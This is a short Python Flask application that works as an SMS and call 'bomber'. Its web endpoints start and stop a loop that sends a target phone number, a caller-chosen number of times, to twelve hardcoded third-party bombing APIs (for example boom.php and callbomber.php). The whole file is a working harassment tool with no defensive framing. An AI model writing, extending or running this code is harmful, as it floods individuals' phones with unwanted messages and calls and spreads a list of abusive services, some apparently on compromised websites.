from flask import Flask, request, jsonify
import requests
import time
from threading import Thread, Event

app = Flask(__name__)

API_ENDPOINTS = [
    "https://rnf.nsmodz.top/api.php?phone=",
    "http://168.119.39.20/~rnfmodsc/api/69.php?phone=",
    "http://107.150.56.100/~bct26/boom.php?phone=",
    "https://ultranetrn.com.br/fonts/api.php?number=",
    "http://api.task10.top/indexapi.php?phone=",
    "https://rnf.nsmodz.top/aapi.php?phone=",
    "http://yousuf323215.serv00.net/api/sms1.php?number=",
    "http://82.112.236.31/callbomber.php?phone=",
    "https://rafixt.my.id/bot/100api.php?phone=",
    "https://abinfotechnologies.com/wp-admin/api/pikachu-call.php?phone=",
    "http://168.119.39.20/~rnfmodsc/call/api.php?key=rafiz&num=",
    "https://serversheba.my.id/bomber/Api.php?num="
]

stop_event = Event()

@app.route('/trigger', methods=['POST'])
def trigger():
    data = request.json
    phone_number = data.get('phoneNumber')
    amount = int(data.get('amount'))

    stop_event.clear()

    thread = Thread(target=send_requests, args=(phone_number, amount))
    thread.start()
    return jsonify({"message": "Requests started successfully"})

@app.route('/stop', methods=['POST'])
def stop():
    data = request.json
    if not data.get('stop'):
        return jsonify({"error": "Invalid request"}), 400

    stop_event.set()
    return jsonify({"message": "Stopping requests"})


def send_requests(phone_number, amount):
    for i in range(amount):
        if stop_event.is_set():
            return
        for api in API_ENDPOINTS:
            if stop_event.is_set():
                return
            full_url = api + phone_number
            try:
                response = requests.get(full_url)
                if response.status_code == 200:
                    print(f"Success from {api}")
                else:
                    print(f"Failed from {api}")
            except Exception as e:
                print(f"Error contacting {api}: {e}")
        time.sleep(1)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
